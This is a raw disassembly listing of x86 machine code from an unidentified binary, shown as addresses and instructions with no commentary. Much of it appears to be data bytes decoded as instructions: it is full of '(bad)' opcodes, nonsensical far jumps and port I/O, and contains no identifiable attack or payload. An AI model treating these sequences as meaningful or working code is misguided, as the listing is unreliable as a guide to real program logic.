  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	ss inc ebx
  413b8d:	add    BYTE PTR [edx+0x68],dh
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    DWORD PTR [ebx+0x0],eax
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [ecx]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x3c7f5414]
  413ea4:	cld    
  413ea5:	out    dx,eax
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [edi-0x577a992c],bl
  413eb3:	inc    edi
  413eb4:	or     cl,ch
  413eb6:	and    DWORD PTR [ecx],esi
  413eb8:	iret   
  413eb9:	jl     0x413ecb
  413ebb:	in     eax,0xe3
  413ebd:	fs mov ah,0xf8
  413ec0:	inc    edi
  413ec1:	add    BYTE PTR [ecx+0x1c],bl
  413ec4:	mov    esp,DWORD PTR [ebx]
  413ec6:	add    DWORD PTR [eax],esi
  413ec8:	or     eax,0xbeee5f57
  413ecd:	cld    
  413ece:	mov    esp,0xc895f0c4
  413ed3:	jge    0x413e9f
  413ed5:	outs   dx,BYTE PTR ds:[esi]
  413ed6:	retf   0x4441
  413ed9:	add    cl,BYTE PTR [eax]
  413edb:	mov    dh,0x2c
  413edd:	jo     0x413e69
  413edf:	lods   al,BYTE PTR ds:[esi]
  413ee0:	or     al,0x3a
  413ee2:	fist   DWORD PTR [esp+ebx*4-0x1bc2ea9b]
  413eea:	mov    esi,DWORD PTR [eax-0x9]
  413eed:	push   edx
  413eee:	push   ds
  413eef:	xchg   dl,bl
  413ef1:	pushw  cs
  413ef3:	xchg   esp,eax
  413ef4:	retf   
  413ef5:	sub    eax,0xfc2d689d
  413efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413efb:	in     al,dx
  413efc:	mov    BYTE PTR [ebx+0x2c70b961],0xce
  413f03:	and    ebp,DWORD PTR [eiz*8+0x6fbf3e25]
  413f0a:	dec    edx
  413f0b:	mov    ebp,0x696a1cee
  413f10:	fstp   DWORD PTR [esi+esi*4-0x637b1f47]
  413f17:	cld    
  413f18:	icebp  
  413f19:	fimul  DWORD PTR [eax-0x6689105b]
  413f1f:	(bad)  
  413f20:	ds pop esi
  413f22:	jne    0x413f96
  413f24:	cli    
  413f25:	(bad)  
  413f27:	dec    ebp
  413f28:	test   eax,0x503e6f5a
  413f2d:	jmp    DWORD PTR [ebp+0x2d4cc2c6]
  413f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f34:	jl     0x413f80
  413f36:	pop    ds
  413f37:	arpl   ax,si
  413f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f3a:	cmp    al,0x6c
  413f3c:	inc    edx
  413f3d:	(bad)  
  413f3e:	stc    
  413f3f:	ins    BYTE PTR es:[edi],dx
  413f40:	clc    
  413f41:	shr    BYTE PTR [ecx+0x6e],1
  413f44:	xchg   ecx,eax
  413f45:	imul   esp,DWORD PTR ds:0x16c05e57,0x64abedf9
  413f4f:	pop    ebx
  413f50:	scas   al,BYTE PTR es:[edi]
  413f51:	jno    0x413eec
  413f53:	and    al,0x64
  413f55:	ret    0xc76a
  413f58:	jle    0x413f54
  413f5a:	adc    eax,0x3b8c50b0
  413f5f:	ret    0x5692
  413f62:	ret    0xa66c
  413f65:	int    0xdc
  413f67:	mov    ah,0xf3
  413f69:	xchg   DWORD PTR [ecx+esi*2+0x2c],ebp
  413f6d:	adc    BYTE PTR [edi+0x5a],cl
  413f70:	(bad)  [ecx-0x2e]
  413f73:	jp     0x413fda
  413f75:	push   eax
  413f76:	sahf   
  413f77:	(bad)  
  413f78:	lock sbb BYTE PTR [ebx+0x6b],dl
  413f7c:	dec    esp
  413f7d:	mov    ch,0x96
  413f7f:	(bad)  
  413f80:	(bad)  [edi]
  413f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f83:	out    0x7d,al
  413f85:	push   eax
  413f86:	test   eax,0xebd157d9
  413f8b:	add    DWORD PTR [esi-0xf],ebx
  413f8e:	cmp    al,0xbd
  413f90:	pop    esp
  413f91:	nop
  413f92:	stc    
  413f93:	ja     0x413f27
  413f95:	and    ecx,DWORD PTR [eax]
  413f97:	pop    ds
  413f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f99:	lods   eax,DWORD PTR ds:[esi]
  413f9a:	xor    eax,0x8600bb89
  413f9f:	aas    
  413fa0:	into   
  413fa1:	dec    edx
  413fa2:	pop    ss
  413fa3:	jo     0x413f8a
  413fa5:	xlat   BYTE PTR ds:[ebx]
  413fa6:	adc    al,0xc
  413fa8:	cdq    
  413fa9:	fild   DWORD PTR [ecx+edi*1]
  413fac:	in     al,dx
  413fad:	clc    
  413fae:	pop    ds
  413faf:	test   al,0xc9
  413fb1:	inc    eax
  413fb2:	test   BYTE PTR [edx],al
  413fb4:	rol    DWORD PTR [eax],cl
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0xcae289f9
  414025:	mov    ?,esp
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [ecx-0x56],dh
  414030:	inc    ebx
  414031:	dec    edx
  414032:	cmp    al,0x87
  414034:	sbb    DWORD PTR [eax],ebp
  414036:	dec    ecx
  414037:	shl    DWORD PTR [ecx-0xd],cl
  41403a:	in     al,dx
  41403b:	das    
  41403c:	push   ebp
  41403d:	xlat   BYTE PTR ds:[ebx]
  41403e:	cmp    esi,ebp
  414040:	mov    ah,0x85
  414042:	sub    eax,0xa0bb6f0e
  414047:	jmp    0x518f:0xaf1d229d
  41404e:	jp     0x4140c8
  414050:	mov    ds:0x7d503885,al
  414055:	push   eax
  414056:	jne    0x414034
  414058:	cs xchg ebp,eax
  41405a:	xchg   esi,eax
  41405b:	stos   DWORD PTR es:[edi],eax
  41405c:	lods   eax,DWORD PTR ds:[esi]
  41405d:	jp     0x414053
  41405f:	or     edi,DWORD PTR [eax-0x2b2db13b]
  414065:	inc    esp
  414066:	aam    0x53
  414068:	add    eax,0x2a31ce1d
  41406d:	or     DWORD PTR [ebp-0x78],ebx
  414070:	call   0xafec3d52
  414075:	pop    edi
  414076:	and    BYTE PTR [ecx],ah
  414078:	cmp    bh,BYTE PTR [edx-0x1b]
  41407b:	xor    ebp,ecx
  41407d:	push   ebx
  41407e:	dec    eax
  41407f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414080:	or     eax,DWORD PTR [edx]
  414082:	or     eax,0x7e3cde9
  414087:	dec    edx
  414088:	dec    edx
  414089:	out    0xb5,eax
  41408b:	sti    
  41408c:	mov    BYTE PTR [esi+0x7ac9020a],dl
  414092:	sbb    ax,0xdf65
  414096:	jne    0x414071
  414098:	push   eax
  414099:	inc    esp
  41409a:	push   edx
  41409b:	push   cs
  41409c:	xlat   BYTE PTR ds:[ebx]
  41409d:	inc    ecx
  41409e:	and    DWORD PTR ds:0x710cc30,0x36f3ff2f
  4140a8:	adc    edx,DWORD PTR [ecx+0x26]
  4140ab:	jle    0x414054
  4140ad:	std    
  4140ae:	ins    BYTE PTR es:[edi],dx
  4140af:	pop    esp
  4140b0:	push   ecx
  4140b1:	or     cl,BYTE PTR [eax*8+0xd8fb150]
  4140b8:	int3   
  4140b9:	fistp  WORD PTR [ebx+0x67]
  4140bc:	or     al,0xd3
  4140be:	sbb    al,0x60
  4140c0:	jp     0x41405b
  4140c2:	dec    ebx
  4140c3:	cmc    
  4140c4:	jl     0x414114
  4140c6:	stc    
  4140c7:	enter  0x5c5d,0xbc
  4140cb:	sbb    al,ah
  4140cd:	dec    edx
  4140ce:	out    dx,eax
  4140cf:	clc    
  4140d0:	daa    
  4140d1:	sbb    dh,BYTE PTR [edx-0x33]
  4140d4:	lds    ecx,FWORD PTR [eax-0x74]
  4140d7:	popa   
  4140d8:	rcl    BYTE PTR [ebp+0x4e39ef09],1
  4140de:	dec    eax
  4140df:	push   es
  4140e0:	test   BYTE PTR [ebx+0x36],0x7d
  4140e4:	jmp    0x546b:0x72c3428b
  4140eb:	mov    esi,0x1aa10bfe
  4140f0:	clc    
  4140f1:	dec    ebx
  4140f2:	push   eax
  4140f3:	jae    0x414110
  4140f5:	sub    ch,BYTE PTR [edi+ecx*2+0x5]
  4140f9:	in     al,dx
  4140fa:	jmp    0x4140ee
  4140fc:	inc    ecx
  4140fd:	cmp    dh,BYTE PTR [edx-0x189cbfe3]
  414103:	mov    ebp,0x530536
  414108:	mov    dl,0x77
  41410a:	not    BYTE PTR [ebp+0xd]
  41410d:	mov    eax,0xad0d07b1
  414112:	or     eax,0x985fe616
  414117:	adc    al,BYTE PTR [esp+eax*4]
  41411a:	push   edi
  41411b:	fcomp  DWORD PTR [edi+0x3c]
  41411e:	inc    esp
  41411f:	add    BYTE PTR [edx-0x38],dh
  414122:	cmp    DWORD PTR [ebx-0x30],eax
  414125:	mov    bl,0xd8
  414127:	sub    al,0x89
  414129:	ds cld 
  41412b:	ins    DWORD PTR es:[edi],dx
  41412c:	clc    
  41412d:	scas   eax,DWORD PTR es:[edi]
  41412e:	push   edx
  41412f:	push   0x58626958
  414134:	mov    cl,0x0
	...
  414196:	add    dl,BYTE PTR [edx]
  414198:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0xcfb929b4
  4141a5:	sar    bl,0xd0
  4141a8:	add    BYTE PTR [eax],al
  4141aa:	pop    es
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [ebp-0x41],bl
  4141b0:	pop    eax
  4141b1:	aaa    
  4141b2:	mov    eax,eax
  4141b4:	xlat   BYTE PTR ds:[ebx]
  4141b5:	in     eax,dx
  4141b6:	push   es
  4141b7:	int    0x77
  4141b9:	bound  edx,QWORD PTR [esi+0x599cc8d4]
  4141bf:	dec    ecx
  4141c0:	jecxz  0x4141e4
  4141c2:	lahf   
  4141c3:	jmp    0x4141b9
  4141c5:	mov    WORD PTR [eax-0x30],?
  4141c8:	adc    BYTE PTR ds:0x2d060715,cl
  4141ce:	cld    
  4141cf:	cli    
  4141d0:	jmp    0x5425:0xcdf37179
  4141d7:	rol    BYTE PTR [ecx+0x639ac3e3],1
  4141dd:	push   ecx
  4141de:	inc    ebp
  4141df:	push   ecx
  4141e0:	hlt    
  4141e1:	add    al,0xc2
  4141e3:	(bad)  
  4141e4:	jp     0x4141d1
  4141e6:	fdiv   st(5),st
  4141e8:	and    DWORD PTR [ecx+edi*8],ebx
  4141eb:	cmp    BYTE PTR [eax],bh
  4141ed:	aad    0xa0
  4141ef:	pop    ss
  4141f0:	call   0xd7a74362
  4141f5:	jl     0x414247
  4141f7:	fidiv  WORD PTR [esi+0x50]
  4141fa:	imul   ebx,DWORD PTR fs:[ebp+0x4f],0x28
  4141ff:	test   eax,0x517e0012
  414204:	pop    ebp
  414205:	das    
  414206:	out    dx,al
  414207:	adc    esp,DWORD PTR [ecx-0x3f]
  41420a:	sbb    DWORD PTR [edx],0xffffffc3
  41420d:	setae  BYTE PTR [ebx+eiz*8+0x3a]
  414212:	adc    ah,BYTE PTR [edi]
  414214:	aam    0x29
  414216:	xor    dh,BYTE PTR ds:[eax+0x55]
  41421a:	cmp    bl,bl
  41421c:	or     ebx,DWORD PTR [edx+0x3feb1b11]
  414222:	sub    al,dh
  414224:	shr    BYTE PTR gs:[edx],cl
  414227:	jnp    0x41429e
  414229:	dec    edx
  41422a:	and    eax,0x3b703476
  41422f:	(bad)  
  414230:	hlt    
  414231:	std    
  414232:	cmp    esi,edi
  414234:	pop    ds
  414235:	xor    eax,0xaa4289e8
  41423a:	inc    edi
  41423b:	lods   al,BYTE PTR ds:[esi]
  41423c:	aas    
  41423d:	push   edi
  41423e:	inc    esi
  41423f:	dec    ebp
  414240:	(bad)  
  414241:	fst    st(0)
  414243:	sbb    eax,0xeaecaa81
  414248:	xchg   DWORD PTR [ecx+0x58],esp
  41424b:	push   ebx
  41424c:	fnstsw WORD PTR [edx]
  41424e:	pop    es
  41424f:	xor    dh,bh
  414251:	fcmovne st,st(2)
  414253:	xchg   ebx,eax
  414254:	dec    ebp
  414255:	mov    edx,0xbe5384c4
  41425a:	xchg   esi,esi
  41425c:	daa    
  41425d:	pop    ds
  41425e:	inc    ecx
  41425f:	xor    edx,0xafd2acfa
  414265:	test   DWORD PTR [ebx],0x5ed14bac
  41426b:	mov    cl,0x8
  41426d:	push   ebx
  41426e:	je     0x414292
  414270:	sbb    BYTE PTR [eax],al
  414272:	int3   
  414273:	mov    bl,0x24
  414275:	jae    0x414278
  414277:	mov    ebp,0x4779720
  41427c:	xchg   ebx,eax
  41427d:	push   esp
  41427e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427f:	cwde   
  414280:	mov    dl,0x4d
  414282:	sar    BYTE PTR [ecx+0x76],cl
  414285:	pop    eax
  414286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414287:	test   eax,0xea61c85d
  41428c:	or     al,0x59
  41428e:	cwde   
  41428f:	sbb    ecx,0x91ccc860
  414295:	dec    edx
  414296:	mov    ah,0xfd
  414298:	jmp    0x414296
  41429a:	sub    DWORD PTR [edi+0x58f9d6e1],esi
  4142a0:	in     eax,0xe9
  4142a2:	fs rsm 
  4142a5:	into   
  4142a6:	je     0x41430f
  4142a8:	add    al,0xdd
  4142ab:	fs fmul st,st(5)
  4142ae:	sbb    al,0x6d
  4142b0:	jle    0x4142aa
  4142b2:	and    DWORD PTR [ecx-0x52],edi
	...
  414315:	add    BYTE PTR [ecx],al
  414317:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0x14be96d7
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [ebp-0x15],bl
  414330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414331:	xor    esp,DWORD PTR [eax]
  414333:	dec    esp
  414334:	jge    0x414307
  414336:	add    DWORD PTR [edx],eax
  414338:	pop    ecx
  414339:	mov    bl,0xd8
  41433b:	adc    eax,0x799ab070
  414340:	and    BYTE PTR [edx+0x64],ah
  414343:	adc    edx,DWORD PTR [ebx+0x5fad7013]
  414349:	add    eax,0x3d7b05f9
  41434e:	fs xchg esp,eax
  414350:	enter  0xe622,0x5f
  414354:	(bad)  [edx+ebx*8+0x32fab231]
  41435b:	ja     0x4143a8
  41435d:	pushf  
  41435e:	or     eax,0xd0d77c7f
  414363:	loop   0x4142f1
  414365:	sub    DWORD PTR ds:0x53a176dd,0x4cc92809
  41436f:	not    DWORD PTR [eax+0x1a]
  414372:	jg     0x41430b
  414374:	jmp    0x669bd548
  414379:	mov    ah,0xd8
